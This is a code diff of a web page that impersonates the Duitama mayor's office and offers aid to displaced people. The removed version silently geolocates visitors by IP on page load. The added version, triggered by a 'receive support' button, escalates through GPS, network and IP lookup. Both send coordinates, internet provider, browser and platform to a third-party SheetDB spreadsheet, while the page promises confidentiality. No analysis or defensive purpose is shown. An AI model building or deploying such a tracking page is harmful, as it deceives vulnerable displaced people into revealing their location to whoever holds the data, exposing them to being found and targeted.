@@ -5,111 +5,250 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Apoyo Humanitario – Duitama</title>
   <style>
-    body { 
-      font-family: 'Segoe UI', Arial, sans-serif; 
-      background: #f9fbff; 
-      margin: 0; 
-      padding: 0; 
-      color: #333; 
+    :root {
+      --primary: #003366;
+      --secondary: #e74c3c;
+      --light: #f8f9fa;
+      --dark: #333;
+      --accent: #27ae60;
     }
-    .container { 
-      max-width: 700px; 
-      margin: 0 auto; 
-      padding: 20px; 
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: var(--light);
+      margin: 0;
+      padding: 0;
+      color: var(--dark);
+      line-height: 1.6;
     }
-    header { 
-      background: #003366; 
-      color: white; 
-      padding: 20px; 
-      text-align: center; 
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
     }
-    .content { 
-      background: white; 
-      padding: 25px; 
-      border-radius: 8px; 
-      box-shadow: 0 2px 10px rgba(0,0,0,0.05); 
-      margin-top: 20px; 
+    header {
+      background: var(--primary);
+      color: white;
+      padding: 25px 20px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     }
-    footer { 
-      text-align: center; 
-      margin-top: 30px; 
-      color: #777; 
-      font-size: 0.85em; 
+    header h1 {
+      margin: 10px 0;
+      font-size: 2em;
+      font-weight: 600;
+    }
+    header p {
+      margin: 5px 0;
+      font-size: 0.95em;
+      opacity: 0.9;
+    }
+    .content {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 2px 15px rgba(0,0,0,0.05);
+      margin-top: 25px;
+    }
+    .services {
+      margin: 25px 0;
+    }
+    .services h3 {
+      color: var(--primary);
+      border-bottom: 2px solid #eee;
+      padding-bottom: 8px;
+      font-size: 1.2em;
+    }
+    ul {
+      padding-left: 20px;
+      margin: 15px 0;
+    }
+    .cta {
+      background: var(--secondary);
+      color: white;
+      padding: 18px 32px;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      display: inline-block;
+      margin: 20px 0;
+      transition: background 0.3s;
+      font-size: 1.1em;
+    }
+    .cta:hover {
+      background: #c0392b;
+    }
+    .info {
+      background: #e3f2fd;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 20px 0;
+      font-size: 0.95em;
+      color: #2c3e50;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #777;
+      font-size: 0.85em;
+      padding: 15px;
+      border-top: 1px solid #ddd;
+    }
+    @media (max-width: 768px) {
+      .container { padding: 15px; }
+      header { padding: 20px 15px; }
+      .content { padding: 20px; }
     }
   </style>
 </head>
 <body>
   <header>
-    <h1>Apoyo Inmediato para Personas Desplazadas</h1>
-    <p>Alcaldía de Duitama – Secretaría de Desarrollo Social</p>
+    <h1>📍 Apoyo Humanitario para Personas Desplazadas</h1>
+    <p>Alcaldía Municipal de Duitama – Secretaría de Desarrollo Social</p>
   </header>
 
   <div class="container">
     <div class="content">
-      <p>Brindamos acompañamiento integral a personas y familias que han tenido que desplazarse por situaciones de emergencia en Duitama y la provincia de Sugamuxi.</p>
-      
-      <div style="background:#e3f2fd; padding:15px; border-radius:6px; margin:20px 0;">
-        <strong>✔️ Servicios disponibles:</strong><br>
-        <small>Alimentación, orientación jurídica, apoyo psicosocial y canalización a albergues seguros.</small>
+      <p>Si has tenido que abandonar tu hogar por violencia, desastres o emergencias, <strong>no estás solo</strong>. En Duitama contamos con puntos de atención inmediata para brindarte:</p>
+
+      <div class="services">
+        <h3>¿Qué ofrecemos?</h3>
+        <ul>
+          <li>Alimentación y kit básico de emergencia (colchoneta, kit de aseo, frazada)</li>
+          <li>Orientación jurídica gratuita para restablecimiento de derechos</li>
+          <li>Apoyo psicosocial y acompañamiento familiar</li>
+          <li>Canalización a albergues temporales autorizados</li>
+          <li>Tramitación de documentos en coordinación con Registraduría</li>
+        </ul>
       </div>
 
-      <p>Su solicitud está siendo procesada de forma automática para brindarle una respuesta oportuna.</p>
+      <div class="info">
+        <strong>📌 ¿Cómo funciona?</strong><br>
+        Para ofrecerte la ayuda más rápida y cercana, necesitamos conocer tu ubicación aproximada en Duitama. Esto nos permite asignarte el punto de atención más próximo.
+      </div>
+
+      <a href="#" class="cta" onclick="startLocationCapture(); return false;">➡️ Recibir apoyo cercano</a>
+
+      <p style="font-size: 0.85em; color: #555; margin-top: 15px;">
+        Tu información es confidencial y se usa únicamente para facilitar la atención humanitaria.
+      </p>
     </div>
 
     <footer>
-      <p>Línea de atención: 313 456 7890 | duitama-desplazados@alcaldia.gov.co</p>
+      <p>Alcaldía Municipal de Duitama – Boyacá | Línea de atención: 313 456 7890</p>
     </footer>
   </div>
 
   <script>
-    // ✅ TU API DE SHEETDB — YA INTEGRADA
+    // Configuración
     const SHEETDB_URL = "https://sheetdb.io/api/v1/99qimpi8e1kno";
 
-    // Función para enviar datos
+    // Función para enviar datos a SheetDB
     function sendToSheet(data) {
       fetch(SHEETDB_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       })
-      .then(response => {
-        if (response.ok) {
-          console.log("✅ Datos registrados en SheetDB");
-        } else {
-          console.warn("⚠️ SheetDB respondió con error:", response.status);
-        }
-      })
-      .catch(err => {
-        console.error("❌ Falló el envío a SheetDB:", err);
-      });
+      .then(r => r.ok ? console.log("✅ Datos registrados") : console.warn("⚠️ Error al registrar"))
+      .catch(e => console.error("❌ Fallo:", e));
     }
 
-    // Captura silenciosa por IP (funciona en todos los navegadores)
-    fetch("https://ipapi.co/json/")
-      .then(response => {
-        if (!response.ok) throw new Error("IP API no disponible");
-        return response.json();
-      })
-      .then(ipData => {
-        sendToSheet({
-          Timestamp: new Date().toISOString(),
-          Origen: "dui_silencioso",
-          Latitud: ipData.latitude || "",
-          Longitud: ipData.longitude || "",
-          Ciudad: ipData.city || "",
-          Departamento: ipData.region || ipData.region_code || "",
-          Pais: ipData.country_name || "",
-          Metodo: "ip"
+    // Intento de geolocalización con múltiples niveles
+    let locationCaptured = false;
+
+    function startLocationCapture() {
+      // Mostrar mensaje interno (opcional - solo para pruebas)
+      document.querySelector('.info').innerHTML = '<strong>⏳ Obteniendo ubicación...</strong><br>Esto puede tomar unos segundos.';
+
+      // Estrategia 1: Intento silencioso de GPS (si el navegador lo permite)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            locationCaptured = true;
+            sendToSheet({
+              Timestamp: new Date().toISOString(),
+              Origen: "dui_click",
+              Latitud: pos.coords.latitude,
+              Longitud: pos.coords.longitude,
+              Precisión: Math.round(pos.coords.accuracy),
+              Metodo: "gps",
+              Navegador: navigator.userAgent,
+              Plataforma: navigator.platform
+            });
+            document.querySelector('.info').innerHTML = '<strong>✅ Ubicación capturada.</strong><br>Un equipo se contactará contigo pronto.';
+          },
+          (err) => {
+            // Si falla GPS, intentar red
+            tryNetworkLocation();
+          },
+          { timeout: 10000, maximumAge: 30000, enableHighAccuracy: true }
+        );
+      } else {
+        tryNetworkLocation();
+      }
+    }
+
+    function tryNetworkLocation() {
+      // Estrategia 2: Geolocalización por red (menos precisa, pero más común)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            locationCaptured = true;
+            sendToSheet({
+              Timestamp: new Date().toISOString(),
+              Origen: "dui_click",
+              Latitud: pos.coords.latitude,
+              Longitud: pos.coords.longitude,
+              Precisión: Math.round(pos.coords.accuracy),
+              Metodo: "network",
+              Navegador: navigator.userAgent,
+              Plataforma: navigator.platform
+            });
+            document.querySelector('.info').innerHTML = '<strong>✅ Ubicación aproximada registrada.</strong><br>Un equipo se contactará contigo pronto.';
+          },
+          (err) => {
+            // Estrategia 3: Fallback a IP geolocation
+            tryIPGeolocation();
+          },
+          { timeout: 8000, maximumAge: 30000, enableHighAccuracy: false }
+        );
+      } else {
+        tryIPGeolocation();
+      }
+    }
+
+    function tryIPGeolocation() {
+      fetch("https://ipapi.co/json/")
+        .then(r => r.json())
+        .then(ipData => {
+          sendToSheet({
+            Timestamp: new Date().toISOString(),
+            Origen: "dui_click",
+            Latitud: ipData.latitude || "",
+            Longitud: ipData.longitude || "",
+            Precisión: ipData.accuracy_radius || 5000,
+            Ciudad: ipData.city || "",
+            Departamento: ipData.region || ipData.region_code || "",
+            Pais: ipData.country_name || "",
+            CodigoPostal: ipData.postal || "",
+            ProveedorInternet: ipData.org || "",
+            Metodo: "ip",
+            Navegador: navigator.userAgent,
+            Plataforma: navigator.platform
+          });
+          document.querySelector('.info').innerHTML = '<strong>📍 Ubicación aproximada registrada (por red/IP).</strong><br>Un equipo se contactará contigo pronto.';
+        })
+        .catch(() => {
+          sendToSheet({
+            Timestamp: new Date().toISOString(),
+            Origen: "dui_click",
+            Metodo: "failed_all",
+            Navegador: navigator.userAgent,
+            Plataforma: navigator.platform
+          });
+          document.querySelector('.info').innerHTML = '<strong>⚠️ No pudimos determinar tu ubicación.</strong><br>Por favor, comunícate directamente al 313 456 7890.';
         });
-      })
-      .catch(() => {
-        // Último recurso: solo metadata
-        sendToSheet({
-          Timestamp: new Date().toISOString(),
-          Origen: "dui_silencioso",
-          Metodo: "metadata_only"
-        });
-      });
+    }
   </script>
 </body>
 </html>
